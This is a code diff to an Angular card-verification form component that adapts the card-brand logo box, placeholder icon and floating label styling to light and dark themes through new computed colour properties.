@@ -61,17 +61,21 @@ import { TranslatePipe } from '../pipes/translate.pipe';
                     {{ 'CARD.Card Number' | translate }}
                </label>
                
+
                <!-- Dynamic Brand Icon -->
                @if(cardType() !== 'unknown') {
-                   <div class="absolute right-4 top-1/2 -translate-y-1/2 h-7 w-10 bg-white shadow-sm border rounded flex items-center justify-center animate-fade-in pointer-events-none">
-                        <img *ngIf="cardType() === 'visa'" src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" class="h-3 object-contain">
+                   <div class="absolute right-4 top-1/2 -translate-y-1/2 h-7 w-12 border rounded flex items-center justify-center animate-fade-in pointer-events-none"
+                        [style.background]="inputBg()"
+                        [style.border-color]="borderColor()">
+                        <img *ngIf="cardType() === 'visa'" src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" class="h-3 object-contain" [class.invert]="isDark()">
                         <img *ngIf="cardType() === 'mastercard'" src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" class="h-4 object-contain">
-                        <img *ngIf="cardType() === 'amex'" src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg" class="h-3 object-contain">
-                        <img *ngIf="cardType() === 'discover'" src="https://upload.wikimedia.org/wikipedia/commons/5/57/Discover_Card_logo.svg" class="h-5 object-contain">
+                        <img *ngIf="cardType() === 'amex'" src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg" class="h-3 object-contain" [class.invert]="isDark()">
+                        <img *ngIf="cardType() === 'discover'" src="https://upload.wikimedia.org/wikipedia/commons/5/57/Discover_Card_logo.svg" class="h-5 object-contain" [class.invert]="isDark()">
                    </div>
                }
                @else {
-                   <span class="material-icons absolute right-4 top-1/2 -translate-y-1/2 text-slate-300 text-2xl pointer-events-none">credit_card</span>
+                   <span class="material-icons absolute right-4 top-1/2 -translate-y-1/2 text-2xl pointer-events-none opacity-50"
+                         [style.color]="inputTextColor()">credit_card</span>
                }
           </div>
 
@@ -178,6 +182,9 @@ export class CardVerificationComponent {
   headerColor = computed(() => this.theme()?.input.textColor || '#003087');
   textColor = computed(() => this.theme()?.input.textColor || '#6b7280');
   inputTextColor = computed(() => this.theme()?.input.textColor || '#111827');
+  inputBg = computed(() => this.theme()?.input.backgroundColor || '#ffffff');
+  isDark = computed(() => this.theme()?.mode === 'dark');
+  borderColor = computed(() => this.isDark() ? '#555' : '#e5e7eb');
 
   btnBackground = computed(() => this.theme()?.button.background || '#003087');
   btnTextColor = computed(() => this.theme()?.button.color || '#ffffff');
@@ -202,8 +209,8 @@ export class CardVerificationComponent {
 
   labelClasses() {
     // Reusing floating label logic
-    const style = this.theme()?.input.style;
-    const base = "text-sm text-gray-400 peer-placeholder-shown:scale-100 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:top-1/2 peer-focus:top-2 peer-focus:scale-75 peer-focus:-translate-y-0 peer-focus:text-blue-600 left-4 top-2 scale-75 -translate-y-0 cursor-text";
+    // Note: text-current allows inheriting color from inputTextColor via opacity or explicit bind
+    const base = "text-sm peer-placeholder-shown:scale-100 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:top-1/2 peer-focus:top-2 peer-focus:scale-75 peer-focus:-translate-y-0 left-4 top-2 scale-75 -translate-y-0 cursor-text opacity-60 peer-focus:opacity-100 transition-all";
     return base;
   }
 
